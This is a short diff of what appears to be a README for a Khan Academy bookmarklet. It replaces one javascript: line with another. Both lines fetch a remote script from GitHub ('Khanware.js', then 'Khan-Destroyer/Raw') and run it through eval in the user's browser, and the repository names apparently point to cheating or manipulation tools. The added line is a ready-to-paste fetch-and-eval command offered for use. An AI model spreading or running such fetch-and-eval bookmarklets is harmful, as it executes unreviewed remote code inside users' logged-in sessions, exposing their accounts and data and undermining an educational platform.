@@ -8,8 +8,8 @@
 
 ## KHAM ACADEMY
 
-```js
-javascript:fetch("https://raw.githubusercontent.com/Niximkk/Khanware/refs/heads/main/Khanware.js").then(t=>t.text()).then(eval);
+```
+javascript:fetch("https://raw.githubusercontent.com/Snowxyrzk/Khan-Destroyer/refs/heads/main/Raw").then(t=>t.text()).then(eval);
 ```
 
 <img src="https://i.ibb.co/23Rn72BZ/download.jpg" width="250" height="250">   
